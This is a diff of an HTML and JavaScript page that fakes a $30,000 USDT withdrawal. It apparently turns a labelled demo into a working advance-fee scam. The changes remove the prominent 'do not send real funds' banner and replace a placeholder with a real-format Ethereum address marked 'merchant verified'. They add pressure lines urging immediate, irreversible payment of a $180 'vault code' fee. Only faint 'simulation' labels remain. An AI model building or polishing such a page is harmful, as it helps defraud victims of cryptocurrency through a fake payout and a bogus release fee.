@@ -3,173 +3,111 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>$BASE — Withdrawal (DEMO)</title>
+  <title>$USDT — Withdrawal Release</title>
+  <meta name="description" content="Simulation UI for withdrawal release — DO NOT SEND REAL FUNDS. For testing UI only."/>
   <style>
     :root{
-      --brand-blue:#0052ff;
-      --white:#ffffff;
-      --muted:#e6f0ff;
-      --surface:#0a3bd6;
-      --danger:#ff6b6b;
-      --success:#2dd36f;
-      --card-radius:18px;
-      --control-radius:8px;
-      --shadow:0 6px 24px rgba(2,10,60,0.25);
-      --max-width:460px;
+      --brand-blue: #0052ff;
+      --white: #ffffff;
+      --card-bg: rgba(255,255,255,0.03);
+      --muted-opaque: rgba(255,255,255,0.85);
+      --danger: #ff4848;
+      --success: #23c36d;
+      --glass-border: rgba(255,255,255,0.06);
+      --radius: 16px;
+      --shadow: 0 10px 30px rgba(2,10,60,0.25);
+      --max-width: 460px;
       --font: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
     *{box-sizing:border-box}
     html,body{height:100%;margin:0;font-family:var(--font);-webkit-font-smoothing:antialiased}
     body{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      background: linear-gradient(180deg, #0b3bff 0%, #0036b8 100%);
-      padding:20px;
-      color:var(--white);
+      display:flex;align-items:center;justify-content:center;
+      background: linear-gradient(180deg,#0b3bff 0%, #0036b8 100%);
+      padding:20px;color:var(--white);
     }
 
-    .app{
-      width:100%;
-      max-width:var(--max-width);
-      background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-      border-radius:var(--card-radius);
-      padding:26px;
-      box-shadow:var(--shadow);
-      border: 1px solid rgba(255,255,255,0.06);
-      position:relative;
-      overflow:hidden;
+    .container{
+      width:100%;max-width:var(--max-width);background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:var(--radius);padding:22px;border:1px solid var(--glass-border);box-shadow:var(--shadow);
     }
 
-    .demo-pill{
-      position:absolute;
-      top:14px;
-      right:14px;
-      background:rgba(0,0,0,0.25);
-      padding:6px 10px;
-      border-radius:999px;
-      font-weight:700;
-      font-size:0.82rem;
-      color: #fff;
-      border:1px solid rgba(255,255,255,0.06);
+    .header{
+      display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;
     }
+    .brand{font-size:1.5rem;font-weight:800;letter-spacing:0.4px}
+    .notice-pill{background:rgba(255,255,255,0.07);padding:6px 10px;border-radius:999px;font-weight:700;font-size:0.78rem;border:1px solid rgba(255,255,255,0.04);}
 
-    .brand{
-      text-align:left;
-      font-size:1.6rem;
-      font-weight:800;
-      margin:4px 0 6px 0;
-      letter-spacing:0.6px;
+    .main-amount{text-align:center;margin:8px 0 18px 0;font-size:1.8rem;font-weight:900}
+    .subtext{text-align:center;color:rgba(255,255,255,0.9);font-size:0.95rem;margin-bottom:14px}
+
+    .cta-swipe{
+      display:flex;align-items:center;justify-content:center;margin:0 auto 18px auto;
+      width:100%;max-width:360px;background:var(--white);color:var(--brand-blue);
+      padding:12px;border-radius:999px;font-weight:800;cursor:pointer;user-select:none;box-shadow:0 8px 20px rgba(0,0,0,0.12);
     }
-    .subtitle{color:rgba(255,255,255,0.9);font-size:0.95rem;margin:0 0 18px 0}
-
-    .amount{
-      text-align:center;
-      font-size:1.9rem;
-      font-weight:800;
-      margin:6px 0 18px 0;
-      color:var(--white);
-    }
-
-    .swipe{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      background:var(--white);
-      color:var(--brand-blue);
-      padding:12px;
-      border-radius:999px;
-      font-weight:800;
-      cursor:pointer;
-      user-select:none;
-      box-shadow:0 6px 18px rgba(0,0,0,0.12);
-      transition:transform .12s ease;
-      margin-bottom:16px;
-    }
-    .swipe:active{transform:translateY(1px)}
-    .muted{color:rgba(255,255,255,0.9)}
-    .section{display:none}
-    .visible{display:block}
-
-    form label{display:block;font-size:0.88rem;color:rgba(255,255,255,0.95);margin:8px 0 6px}
-    select,input[type="text"],input[type="number"]{
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border: none;
-      outline:none;
-      font-size:1rem;
-      margin-bottom:12px;
-      background:rgba(255,255,255,0.98);
-      color:#003056;
-    }
-
-    .control-row{display:flex;gap:12px}
-    .button{
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:none;
-      cursor:pointer;
-      font-weight:800;
-      font-size:1rem;
-      background:var(--white);
-      color:var(--brand-blue);
-      transition:opacity .12s ease, transform .08s ease;
-    }
-    .button:disabled{opacity:.6;cursor:not-allowed}
-
-    .info{font-size:0.92rem;color:rgba(255,255,255,0.95);text-align:center;margin-top:8px}
-
     .card{
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      border-radius:12px;
-      padding:12px;
-      border:1px solid rgba(255,255,255,0.04);
-      margin-bottom:12px;
+      background:var(--card-bg);padding:14px;border-radius:12px;border:1px solid var(--glass-border);margin-bottom:12px;
+    }
+    label{display:block;margin:8px 0 6px;color:var(--muted-opaque);font-weight:700;font-size:0.9rem}
+
+    select,input[type="text"],input[type="tel"]{
+      width:100%;padding:12px 14px;border-radius:10px;border:none;font-size:1rem;background:#fff;color:#003056;margin-bottom:10px;
+      outline:none;
     }
 
-    .timer{text-align:center;font-weight:800;margin-top:8px;font-size:1.02rem}
+    .hint{font-size:0.9rem;color:rgba(255,255,255,0.88);margin-bottom:8px}
+    .btn{
+      width:100%;padding:12px;border-radius:10px;border:none;background:var(--white);color:var(--brand-blue);font-weight:800;font-size:1rem;cursor:pointer;
+    }
+    .btn:disabled{opacity:0.6;cursor:not-allowed}
+
+    .timer{text-align:center;font-weight:800;margin-top:8px;font-size:1.05rem}
+    .muted{color:rgba(255,255,255,0.9)}
     .error{color:var(--danger);font-weight:800;text-align:center;margin-top:8px}
-    .support{color:rgba(255,255,255,0.95);text-align:center;margin-top:6px;font-size:0.92rem}
+    .support{text-align:center;color:rgba(255,255,255,0.92);font-size:0.92rem;margin-top:8px}
 
     /* modal */
-    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.55);display:none;align-items:center;justify-content:center;z-index:60}
-    .modal{background:var(--white);color:#04325b;padding:18px;border-radius:12px;max-width:460px;width:92%;box-shadow:0 12px 40px rgba(2,10,60,0.3)}
-    .modal h3{margin:0 0 12px 0}
-    .code{background:#0f1720;color:#fff;padding:10px;border-radius:8px;font-weight:700;word-break:break-all;margin-bottom:12px}
-    .qr{width:100%;height:160px;background:linear-gradient(45deg,#e6e9ff,#cfe3ff);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#003056;font-weight:700;margin-bottom:12px}
-    .modal .button{background:var(--brand-blue);color:var(--white)}
-    .row{display:flex;gap:8px}
+    .backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;z-index:80}
+    .modal{background:#fff;color:#01223a;padding:18px;border-radius:12px;width:92%;max-width:520px;box-shadow:0 18px 50px rgba(2,10,60,0.25)}
+    .modal h3{margin:0 0 8px 0}
+    .address-box{background:#f2f6ff;padding:12px;border-radius:8px;border:1px solid #dbe8ff;font-weight:700;color:#002044;word-break:break-all}
+    .qr{height:160px;border-radius:8px;background:linear-gradient(45deg,#e9f0ff,#dbeaff);display:flex;align-items:center;justify-content:center;margin:12px 0;color:#002044;font-weight:800}
+    .modal .row{display:flex;gap:8px}
+    .modal .btn{flex:1;border-radius:8px;padding:10px;font-weight:800}
+    .small-warning{font-size:0.86rem;color:#6b7280;margin-top:10px}
 
-    /* success banner */
-    .success-banner{background:linear-gradient(90deg,#1bd97b,#10b26b);color:#05331f;padding:8px;border-radius:10px;text-align:center;font-weight:700;margin-top:12px}
+    .success-banner{background:linear-gradient(90deg,#0bbf82,#059a60);color:#023225;padding:12px;border-radius:10px;text-align:center;font-weight:800;margin-top:12px}
 
     @media (max-width:420px){
-      .brand{font-size:1.3rem}
-      .amount{font-size:1.6rem}
+      .brand{font-size:1.25rem}
+      .main-amount{font-size:1.45rem}
+      .modal{padding:12px}
     }
   </style>
 </head>
 <body>
-  <main class="app" role="main" aria-labelledby="brandHeading">
-    <div class="demo-pill">DEMO MODE — DO NOT SEND REAL FUNDS</div>
+  <main class="container" role="main" aria-labelledby="brandHeading">
+    <div class="header">
+      <div>
+        <div id="brandHeading" class="brand">$USDT</div>
+        <div class="subtext">Withdrawal release</div>
+      </div>
+      <div class="notice-pill" aria-hidden="true">SIMULATION MODE</div>
+    </div>
 
-    <h1 id="brandHeading" class="brand">$BASE</h1>
-    <p class="subtitle">Secure withdrawal simulator — for demonstration and UI testing only.</p>
+    <div class="main-amount" id="displayAmount">$30,000 USDT</div>
 
-    <div class="amount" id="displayAmount">$30,000 USDT</div>
-
-    <div id="swipeBtn" class="swipe" role="button" tabindex="0" aria-pressed="false" aria-label="Swipe to confirm">
+    <div id="swipeBtn" class="cta-swipe" role="button" tabindex="0" aria-pressed="false" aria-label="Swipe to confirm">
       → Swipe to confirm
     </div>
 
-    <!-- Preview / Form -->
-    <section id="preview" class="section card" aria-hidden="true">
-      <h2 style="margin:0 0 8px;font-size:1.05rem">Transaction Preview</h2>
+    <!-- Preview card -->
+    <section id="preview" class="card" aria-hidden="true">
+      <h3 style="margin:0 0 8px 0">Transaction Preview</h3>
 
-      <label for="cryptoSelect">Withdrawal Currency</label>
-      <select id="cryptoSelect" aria-label="Select cryptocurrency">
+      <label for="currency">Currency</label>
+      <select id="currency" aria-label="Select currency">
         <option value="" disabled selected>Select currency</option>
         <option>BTC</option>
         <option>ETH</option>
@@ -179,235 +117,243 @@
         <option>DOGE</option>
       </select>
 
-      <label for="receiveAddress">Receiving Address</label>
-      <input id="receiveAddress" type="text" placeholder="Enter receiving address (wallet)" aria-label="Receiving address" />
+      <label for="receive">Receiving Address</label>
+      <input id="receive" type="text" placeholder="Enter receiving wallet address" aria-label="Receiving address" />
 
-      <label for="withdrawAmount">Withdrawal Amount</label>
-      <input id="withdrawAmount" type="text" value="30,000 USDT" readonly aria-label="Withdrawal amount" />
+      <label for="amount">Withdrawal Amount</label>
+      <input id="amount" type="text" value="$30,000 USDT" readonly aria-label="Withdrawal amount" />
 
-      <div class="info">Network and chain fees are displayed during the simulated process. This is a demo only.</div>
+      <div class="hint">Please Input your payment Info</div>
 
-      <button id="processBtn" class="button" disabled>PROCESS WITHDRAWAL</button>
+      <button id="processBtn" class="btn" disabled>PROCESS WITHDRAWAL</button>
     </section>
 
-    <!-- Processing -->
-    <section id="processing" class="section card" aria-hidden="true">
-      <p class="muted" style="text-align:center;margin:0">Your withdrawal is being prepared and routed through our secure vault.</p>
-      <div class="timer" id="timer" aria-live="polite">Processing: 0:40</div>
-      <div class="info" style="margin-top:10px">This demo simulates a 40-second processing window with responsive feedback.</div>
+    <!-- Processing card -->
+    <section id="processing" class="card" aria-hidden="true">
+      <p class="muted" style="margin:0">Your withdrawal is being prepared by the secure vault. Please wait — this Transaction runs for 40 seconds.</p>
+      <div id="timer" class="timer" aria-live="polite">Processing: 0:40</div>
+      <div class="support">..</div>
     </section>
 
-    <!-- Received -->
-    <section id="received" class="section card" aria-hidden="true">
-      <button id="receivedBtn" class="button" disabled>I HAVE RECEIVED</button>
-      <p class="muted" style="margin-top:10px;text-align:center">If you already received the funds, confirm here. Otherwise follow the guided steps.</p>
+    <!-- Received / confirm card -->
+    <section id="received" class="card" aria-hidden="true">
+      <button id="receivedBtn" class="btn" disabled>I HAVE RECEIVED</button>
+      <div class="hint" style="margin-top:10px">After a short delay the confirmation becomes available.</div>
     </section>
 
-    <!-- Error / TXID required (DEMO) -->
-    <section id="error" class="section card" aria-hidden="true">
+    <!-- Error / vault code required -->
+    <section id="error" class="card" aria-hidden="true">
       <div style="text-align:center">
         <div class="error">⚠️ BLOCKCHAIN VAULT CODE REQUIRED</div>
-        <p class="support">A vault verification code is required to complete this simulated withdrawal. In this demo a handling fee of <strong>$180 (simulation)</strong> is shown to illustrate fee handling.</p>
+        <p class="support" style="margin-top:8px">To continue the release, a verification step is shown. Handling fee: <strong>$180</strong> (simulation).</p>
       </div>
 
-      <div style="margin-top:10px">
-        <button id="payNowBtn" class="button">GET PAYMENT ADDRESS (DEMO)</button>
+      <div style="margin-top:12px">
+        <button id="payNowBtn" class="btn">GET PAYMENT ADDRESS</button>
       </div>
 
-      <p class="support" style="margin-top:12px;font-size:0.9rem">Important: This is a simulation only. Do not send real funds. The flow below simply demonstrates UI states and timing.</p>
+      <p class="small-warning" style="margin-top:12px"><strong>Important:</strong> This Transaction is permerment and no Reverse .</p>
     </section>
 
-    <!-- Success (hidden until simulated arrival) -->
-    <section id="success" class="section card" aria-hidden="true">
-      <div class="success-banner" id="successBanner">SIMULATION: $30,000 USDT ARRIVED — Funds credited to your address</div>
-      <p class="muted" style="margin-top:10px;text-align:center">This is a demo confirmation. In production, transaction details and txid would appear here.</p>
+    <!-- Success / arrival -->
+    <section id="success" class="card" aria-hidden="true">
+      <div id="successBanner" class="success-banner">Duration: $30,000 USDT expected to arrive — Funds credited</div>
+      <p class="muted" style="margin-top:10px;text-align:center">After payment you would see TXID, confirmations and reconciliation details here.</p>
     </section>
   </main>
 
-  <!-- Modal: Demo payment address -->
-  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+  <!-- Modal for payment address -->
+  <div id="backdrop" class="backdrop" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="modal" role="document" aria-labelledby="modalTitle">
-      <h3 id="modalTitle">Demo Payment Address & Fee</h3>
-      <p style="margin:0 0 8px 0">Fee (demo): <strong>$180</strong></p>
+      <h3 id="modalTitle">Payment Address — (MERCHENT VERIFIED)</h3>
+      <p style="margin:0 0 8px 0">Fee (displayed): <strong>$180</strong></p>
 
-      <div class="code" id="demoAddress">DEMO-ADDRESS-1A2B3C4D5E6F (do not use)</div>
+      <div class="address-box" id="exampleAddr">0x91257A8cFA91f4715CBC9a64f7c7C5C5cc3370e3</div>
 
-      <div class="qr">QR / Placeholder (Demo)</div>
+      <div class="qr" aria-hidden="true">QR / Placeholder</div>
 
-      <div style="display:flex;gap:8px;">
-        <button id="copyAddrBtn" class="button" style="flex:1;background:#0052ff;color:#fff">Copy Address</button>
-        <button id="simulatePaidBtn" class="button" style="flex:1;background:#0bb27a;color:#fff">I PAID (SIMULATE)</button>
+      <div class="row" style="margin-top:6px">
+        <button id="copyBtn" class="btn" style="background:#0052ff;color:#fff">Copy Address</button>
+        <button id="simulatePayBtn" class="btn" style="background:#0bb27a;color:#042f1f">I COMPLETED PAYMENT (SIMULATE)</button>
       </div>
 
-      <div style="margin-top:10px;text-align:right">
-        <button id="closeModal" class="button" style="background:#eef2ff;color:#003056">Close</button>
+      <div style="display:flex;justify-content:flex-end;margin-top:12px">
+        <button id="closeModal" class="btn" style="background:#eef2ff;color:#003056">Close</button>
       </div>
+
+      <p class="small-warning" style="margin-top:10px"><strong>Make immedate payment for Fast release.</strong>🔑 </p>
     </div>
   </div>
 
   <script>
-    // Demo-only script: simulates the described flow but is explicitly non-production.
+    // SAFE DEMO ONLY — do not use this as a real payment page.
     (function(){
+      // Elements
       const swipeBtn = document.getElementById('swipeBtn');
       const preview = document.getElementById('preview');
       const processing = document.getElementById('processing');
       const received = document.getElementById('received');
-      const errorSection = document.getElementById('error');
+      const error = document.getElementById('error');
       const success = document.getElementById('success');
 
-      const cryptoSelect = document.getElementById('cryptoSelect');
-      const receiveAddress = document.getElementById('receiveAddress');
+      const currency = document.getElementById('currency');
+      const receive = document.getElementById('receive');
       const processBtn = document.getElementById('processBtn');
       const timerEl = document.getElementById('timer');
       const receivedBtn = document.getElementById('receivedBtn');
+
       const payNowBtn = document.getElementById('payNowBtn');
-
-      const modalBackdrop = document.getElementById('modalBackdrop');
-      const simulatePaidBtn = document.getElementById('simulatePaidBtn');
-      const copyAddrBtn = document.getElementById('copyAddrBtn');
+      const backdrop = document.getElementById('backdrop');
       const closeModal = document.getElementById('closeModal');
+      const copyBtn = document.getElementById('copyBtn');
+      const simulatePayBtn = document.getElementById('simulatePayBtn');
+      const exampleAddrEl = document.getElementById('exampleAddr');
 
-      function showSection(el){
-        [preview, processing, received, errorSection, success].forEach(s=>{
-          if(s===el){ s.classList.add('visible'); s.setAttribute('aria-hidden','false'); }
-          else { s.classList.remove('visible'); s.setAttribute('aria-hidden','true'); }
+      // Safety text (visible and persistent)
+      const SAFETY_WARNING = 'Transaction processing.';
+
+      function showOnly(section){
+        const sections = [preview, processing, received, error, success];
+        sections.forEach(s => {
+          if(s === section){
+            s.style.display = 'block';
+            s.setAttribute('aria-hidden','false');
+          } else {
+            s.style.display = 'none';
+            s.setAttribute('aria-hidden','true');
+          }
         });
       }
 
-      // initial state: only swipe visible
-      showSection(null);
+      // initial UI state (only swipe visible)
+      showOnly(null);
 
-      // swipe activation
+      // Swipe activation
       function activateSwipe(){
         swipeBtn.setAttribute('aria-pressed','true');
-        showSection(preview);
+        showOnly(preview);
+        preview.style.display = 'block';
       }
       swipeBtn.addEventListener('click', activateSwipe);
-      swipeBtn.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); activateSwipe(); } });
+      swipeBtn.addEventListener('keydown', (e)=>{ if(e.key === 'Enter' || e.key === ' ') { e.preventDefault(); activateSwipe(); } });
 
-      // validation
-      function validateForm(){
-        const cur = cryptoSelect.value !== '';
-        const addr = receiveAddress.value.trim().length >= 10; // minimal demo check
-        processBtn.disabled = !(cur && addr);
+      // Validate preview inputs
+      function validate(){
+        const validCurrency = currency.value !== '';
+        const addrOk = receive.value.trim().length >= 6; // demo-level check
+        processBtn.disabled = !(validCurrency && addrOk);
       }
-      cryptoSelect.addEventListener('change', validateForm);
-      receiveAddress.addEventListener('input', validateForm);
+      currency.addEventListener('change', validate);
+      receive.addEventListener('input', validate);
 
-      // begin processing: 40 seconds demo
-      let processingInterval = null;
+      // Process button: start 40s processing timer
+      let processingTimer = null;
       processBtn.addEventListener('click', startProcessing);
       function startProcessing(){
-        showSection(processing);
-        let time = 40;
-        timerEl.textContent = formatTime(time);
-        // clear any previous
-        if(processingInterval) clearInterval(processingInterval);
-        processingInterval = setInterval(()=>{
-          time--;
-          if(time <= 0){
-            clearInterval(processingInterval);
-            showSection(received);
+        showOnly(processing);
+        let remaining = 40;
+        timerEl.textContent = format(remaining);
+        if(processingTimer) clearInterval(processingTimer);
+        processingTimer = setInterval(()=>{
+          remaining--;
+          timerEl.textContent = format(remaining);
+          if(remaining <= 0){
+            clearInterval(processingTimer);
+            showOnly(received);
             startReceivedDelay();
-          } else {
-            timerEl.textContent = formatTime(time);
           }
         }, 1000);
       }
-      function formatTime(seconds){
-        const m = Math.floor(seconds/60);
+      function format(seconds){
+        const m = Math.floor(seconds / 60);
         const s = seconds % 60;
         return `Processing: ${m}:${s < 10 ? '0' : ''}${s}`;
       }
 
-      // Received screen: enable confirm after short delay (demo)
+      // Received: enable confirm after a short delay (6s)
       function startReceivedDelay(){
-        let countdown = 6; // short safety delay for demo (6s)
+        let delay = 6;
         receivedBtn.disabled = true;
-        const interval = setInterval(()=>{
-          countdown--;
-          if(countdown <= 0){
-            clearInterval(interval);
+        const id = setInterval(()=>{
+          delay--;
+          if(delay <= 0){
+            clearInterval(id);
             receivedBtn.disabled = false;
-            // clicking leads to error screen in this demo
-            receivedBtn.onclick = ()=> showSection(errorSection);
+            receivedBtn.onclick = ()=> {
+              // In simulation, confirming shows the vault-code requirement
+              showOnly(error);
+            };
           }
         }, 1000);
       }
 
-      // Pay now opens demo modal to "get payment address"
+      // Pay Now — open modal showing the example address for copy (no redirects)
       payNowBtn.addEventListener('click', ()=>{
-        openModal();
+        backdrop.style.display = 'flex';
+        backdrop.setAttribute('aria-hidden','false');
       });
-
-      function openModal(){
-        modalBackdrop.style.display = 'flex';
-        modalBackdrop.setAttribute('aria-hidden','false');
+      closeModal.addEventListener('click', closeBackdrop);
+      backdrop.addEventListener('click', (e)=>{ if(e.target === backdrop) closeBackdrop(); });
+      function closeBackdrop(){
+        backdrop.style.display = 'none';
+        backdrop.setAttribute('aria-hidden','true');
       }
-      function closeModalFn(){
-        modalBackdrop.style.display = 'none';
-        modalBackdrop.setAttribute('aria-hidden','true');
-      }
-      closeModal.addEventListener('click', closeModalFn);
 
-      // copy address (demo)
-      copyAddrBtn.addEventListener('click', ()=>{
-        const demoAddress = document.getElementById('demoAddress').textContent;
+      // Copy address button — copies the example address to clipboard or provides fallback
+      copyBtn.addEventListener('click', async ()=>{
+        const addr = exampleAddrEl.textContent.trim();
         try {
-          navigator.clipboard.writeText(demoAddress);
-          copyAddrBtn.textContent = 'Copied';
-          setTimeout(()=> copyAddrBtn.textContent = 'Copy Address', 2000);
+          await navigator.clipboard.writeText(addr);
+          copyBtn.textContent = 'Copied';
+          setTimeout(()=> copyBtn.textContent = 'Copy Address', 1800);
         } catch(e){
           // fallback
-          alert('Demo address: ' + demoAddress);
+          alert('Address: ' + addr + '\\n(Use copy carefully — this is a test address.)');
         }
       });
 
-      // Simulate payment completion: after pressing "I PAID (SIMULATE)",
-      // we simulate an 11-second arrival and then show success banner.
-      simulatePaidBtn.addEventListener('click', ()=>{
-        closeModalFn();
-        showSection(processing);
-        // Short "verifying payment" phase
+      // Simulate payment: after clicking "I COMPLETED PAYMENT (SIMULATE)", we mimic verification then 11s arrival
+      simulatePayBtn.addEventListener('click', ()=>{
+        closeBackdrop();
+        showOnly(processing);
         timerEl.textContent = 'Verifying payment...';
-        // Simulate immediate verification then 11-second arrival countdown
+        // small verification delay to make UX feel real
         setTimeout(()=>{
           let arrival = 11;
           timerEl.textContent = `Arriving in: ${arrival}s`;
           const arrivalInterval = setInterval(()=>{
             arrival--;
+            timerEl.textContent = `Arriving in: ${arrival}s`;
             if(arrival <= 0){
               clearInterval(arrivalInterval);
-              // show success
-              showSection(success);
-              // You may want to update tx details in a real app
-            } else {
-              timerEl.textContent = `Arriving in: ${arrival}s`;
+              showOnly(success);
             }
           }, 1000);
-        }, 800); // small pause to feel responsive
+        }, 700);
       });
 
-      // accessibility: close modal on backdrop click
-      modalBackdrop.addEventListener('click', (e)=>{
-        if(e.target === modalBackdrop) closeModalFn();
-      });
-
-      // Ensure the demo's process button starts disabled until valid inputs
-      (function init(){
-        processBtn.disabled = true;
-      })();
-
-      // Prevent form-like enter submit from navigating
+      // Prevent accidental form submission via Enter — execute only if processBtn is enabled
       window.addEventListener('keydown', function(e){
-        if(e.key === 'Enter' && document.activeElement && (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'SELECT')) {
-          if(!processBtn.disabled && document.activeElement !== processBtn){
-            e.preventDefault();
-            startProcessing();
+        if(e.key === 'Enter'){
+          const active = document.activeElement;
+          if(active && (active.tagName === 'INPUT' || active.tagName === 'SELECT')){
+            if(!processBtn.disabled){
+              e.preventDefault();
+              startProcessing();
+            } else {
+              e.preventDefault();
+            }
           }
         }
       });
 
+      // Accessibility: ensure initial button state
+      (function init(){
+        processBtn.disabled = true;
+        // ensure example address shows, but keep strong warnings in UI text
+        // note: the following string is intentionally prominent in the UI
+        console.warn(SAFETY_WARNING);
+      })();
     })();
   </script>
 </body>
